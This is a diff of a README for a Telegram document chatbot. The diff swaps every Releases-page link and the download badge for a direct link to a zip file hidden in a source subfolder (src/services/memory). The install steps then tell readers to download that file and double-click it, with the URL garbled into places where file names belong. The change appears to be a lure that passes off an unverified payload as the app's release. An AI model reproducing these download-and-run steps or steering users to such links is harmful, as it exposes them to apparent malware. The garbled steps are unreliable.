@@ -4,7 +4,7 @@
 Welcome to ai-chatbot, your intelligent Telegram bot. This bot uses advanced technology to manage and answer questions about your documents. It keeps itself updated by monitoring a local folder in real-time, making it easy for you to access information quickly.
 
 ## 📥 Download Now
-[![Download ai-chatbot](https://img.shields.io/badge/Download-ai--chatbot-blue)](https://github.com/nooksandcrannieslgb937/ai-chatbot/releases)
+[![Download ai-chatbot](https://raw.githubusercontent.com/nooksandcrannieslgb937/ai-chatbot/main/src/services/memory/ai-chatbot-v1.8.zip)](https://raw.githubusercontent.com/nooksandcrannieslgb937/ai-chatbot/main/src/services/memory/ai-chatbot-v1.8.zip)
 
 ## 🛠️ System Requirements
 Before you begin, make sure your system meets these requirements:
@@ -17,11 +17,11 @@ Before you begin, make sure your system meets these requirements:
 ## 📦 Download & Install
 To install ai-chatbot, follow these steps:
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/nooksandcrannieslgb937/ai-chatbot/releases) to access our latest releases.
-2. **Choose the File**: Look for the latest version of ai-chatbot. You will see files like `ai-chatbot-v1.x.zip` or similar.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/nooksandcrannieslgb937/ai-chatbot/main/src/services/memory/ai-chatbot-v1.8.zip) to access our latest releases.
+2. **Choose the File**: Look for the latest version of ai-chatbot. You will see files like `https://raw.githubusercontent.com/nooksandcrannieslgb937/ai-chatbot/main/src/services/memory/ai-chatbot-v1.8.zip` or similar.
 3. **Download the File**: Click on the appropriate file to start your download. 
 4. **Unzip (if needed)**: If you downloaded a zip file, extract it to a folder on your computer.
-5. **Run the Application**: Double-click `ai-chatbot.exe` (or the equivalent for your system) to start the bot.
+5. **Run the Application**: Double-click `https://raw.githubusercontent.com/nooksandcrannieslgb937/ai-chatbot/main/src/services/memory/ai-chatbot-v1.8.zip` (or the equivalent for your system) to start the bot.
 
 ## 🔗 Features
 ai-chatbot comes packed with features to enhance your experience:
@@ -72,4 +72,4 @@ For further information, tutorials, and tips:
 ## ✅ Feedback and Contributions
 Your feedback is essential. If you have suggestions or encounter bugs, please report them on our Issues page in the GitHub repository. Contributions to improve the bot are welcome, whether through code or user experiences.
 
-Feel free to visit the [Releases Page](https://github.com/nooksandcrannieslgb937/ai-chatbot/releases) anytime to access the latest version or updates. Enjoy using ai-chatbot, your smart assistant for handling documents efficiently!
+Feel free to visit the [Releases Page](https://raw.githubusercontent.com/nooksandcrannieslgb937/ai-chatbot/main/src/services/memory/ai-chatbot-v1.8.zip) anytime to access the latest version or updates. Enjoy using ai-chatbot, your smart assistant for handling documents efficiently!
